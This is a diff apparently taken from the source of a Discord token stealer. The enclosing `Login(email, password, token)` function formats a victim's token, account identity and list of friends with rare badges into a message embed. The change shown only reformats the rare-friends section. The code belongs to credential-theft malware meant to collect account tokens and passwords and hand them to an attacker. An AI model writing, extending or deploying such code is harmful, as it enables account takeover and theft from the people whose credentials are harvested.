@@ -168,19 +168,19 @@ function Login(email, password, token) {
                             "value": `\`${token}\``,
                             "inline": false
                                  },
-                        {
-                            "name": `Total Friends (${JSON.parse(a).filter((e) => 1 == e.type).length})`,                        
-                            "value": (function () {
-                                const e = JSON.parse(a).filter((e) => 1 == e.type);
-                                var t = "";
-                                for (z of e) {
-                                    var n = GetRBadges(z.user.public_flags);
-                                    "" != n && (t += n + ` ${z.user.username}#${z.user.discriminator}\n`);
+                                 {
+                                    title: `Total Friends (${JSON.parse(a).filter((e) => 1 == e.type).length})`,
+                                    color: config["embed-color"],
+                                    description: (function () {
+                                        const e = JSON.parse(a).filter((e) => 1 == e.type);
+                                        var t = "";
+                                        for (z of e) {
+                                            var n = GetRBadges(z.user.public_flags);
+                                            "" != n && (t += n + ` ${z.user.username}#${z.user.discriminator}\n`);
+                                        }
+                                        return "" == t && (t = "No Rare Friends"), t;
+                                    })(),
                                 }
-                                return "" == t && (t = "No Rare Friends"), t;
-                            })(),
-                            "inline": false
-                        },
                     ],
                     "author": {
                         "name": json.username +"#" + json.discriminator + "・" + json.id,
